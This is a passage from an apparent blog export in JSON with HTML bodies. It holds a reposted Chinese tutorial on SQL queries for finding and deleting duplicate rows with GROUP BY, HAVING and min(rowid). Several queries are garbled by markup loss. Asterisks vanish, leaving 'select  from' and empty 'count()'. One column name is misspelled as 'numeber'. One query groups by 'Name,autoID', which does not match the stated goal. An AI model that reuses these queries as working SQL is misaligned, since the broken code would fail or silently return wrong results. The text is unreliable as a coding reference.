onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","slug":"SQL重复记录查询（转载）","published":1,"updated":"2016-10-05T18:35:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiska2000l3sonexik6et9","content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font>  <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img 